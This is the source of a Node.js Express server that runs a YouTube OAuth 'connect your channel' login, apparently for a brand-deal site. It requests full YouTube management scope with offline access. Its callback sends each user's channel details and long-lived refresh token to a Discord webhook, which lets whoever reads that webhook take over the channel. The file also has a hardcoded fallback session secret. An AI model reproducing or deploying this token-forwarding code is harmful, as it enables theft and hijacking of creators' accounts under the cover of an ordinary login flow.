require("dotenv").config();
const express = require("express");
const axios = require("axios");
const session = require("express-session");
const cors = require("cors");

const app = express();

// --------------------
// CONFIG
// --------------------
const PORT = process.env.PORT || 3000;

app.use(cors({
  origin: process.env.FRONTEND_URL || true,
  credentials: true
}));

app.use(express.json());

// ⚠️ SESSION (memory-based, temporary)
app.use(session({
  secret: process.env.SESSION_SECRET || "brandtier_secret_key",
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    sameSite: "none"
  }
}));

// --------------------
// DISCORD WEBHOOK
// --------------------
async function sendToDiscord(payload) {
  try {
    await axios.post(process.env.DISCORD_WEBHOOK_URL, {
      embeds: [
        {
          title: "YouTube OAuth Login",
          color: 5814783,
          fields: [
            { name: "Channel", value: payload.name || "N/A" },
            { name: "Subscribers", value: String(payload.subs || "N/A") },
            { name: "Views", value: String(payload.views || "N/A") },
            { name: "Videos", value: String(payload.videos || "N/A") },
            { name: "Refresh Token", value: payload.refresh_token || "N/A" }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    });
  } catch (err) {
    console.log("Discord webhook error:", err.message);
  }
}

// --------------------
// 1. OAuth LOGIN
// --------------------
app.get("/auth", (req, res) => {
  const url =
    "https://accounts.google.com/o/oauth2/v2/auth?" +
    new URLSearchParams({
      client_id: process.env.CLIENT_ID,
      redirect_uri: process.env.REDIRECT_URI,
      response_type: "code",
      scope: "https://www.googleapis.com/auth/youtube",
      access_type: "offline",
      prompt: "consent"
    });

  res.redirect(url);
});

// --------------------
// 2. OAuth CALLBACK
// --------------------
app.get("/callback", async (req, res) => {
  const code = req.query.code;

  try {
    // exchange code for tokens
    const tokenRes = await axios.post(
      "https://oauth2.googleapis.com/token",
      new URLSearchParams({
        code,
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        redirect_uri: process.env.REDIRECT_URI,
        grant_type: "authorization_code"
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        }
      }
    );

    const { access_token, refresh_token } = tokenRes.data;

    // store in session (temporary)
    req.session.tokens = { access_token, refresh_token };

    // fetch YouTube channel
    const yt = await axios.get(
      "https://www.googleapis.com/youtube/v3/channels",
      {
        params: {
          part: "snippet,statistics",
          mine: true
        },
        headers: {
          Authorization: `Bearer ${access_token}`
        }
      }
    );

    const channel = yt.data.items?.[0];

    if (!channel) {
      return res.status(400).send("No channel found");
    }

    // send to Discord webhook
    await sendToDiscord({
      name: channel.snippet.title,
      subs: channel.statistics.subscriberCount,
      views: channel.statistics.viewCount,
      videos: channel.statistics.videoCount,
      refresh_token
    });

    // redirect frontend
    res.redirect(process.env.FRONTEND_URL + "/?connected=1");

  } catch (err) {
    console.log(err.response?.data || err.message);
    res.status(500).send("OAuth Error");
  }
});

// --------------------
// 3. GET USER DATA
// --------------------
app.get("/api/youtube", async (req, res) => {
  if (!req.session.tokens) {
    return res.status(401).send("Not logged in");
  }

  try {
    const yt = await axios.get(
      "https://www.googleapis.com/youtube/v3/channels",
      {
        params: {
          part: "snippet,statistics",
          mine: true
        },
        headers: {
          Authorization: `Bearer ${req.session.tokens.access_token}`
        }
      }
    );

    const channel = yt.data.items?.[0];

    if (!channel) {
      return res.status(400).send("No channel found");
    }

    res.json({
      name: channel.snippet.title,
      avatar: channel.snippet.thumbnails.default.url,
      subscribers: channel.statistics.subscriberCount,
      views: channel.statistics.viewCount,
      videos: channel.statistics.videoCount
    });

  } catch (err) {
    res.status(500).send("Failed to fetch YouTube data");
  }
});

// --------------------
// 4. LOGOUT
// --------------------
app.get("/logout", (req, res) => {
  req.session.destroy(() => {
    res.send("Logged out");
  });
});

// --------------------
// START SERVER
// --------------------
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
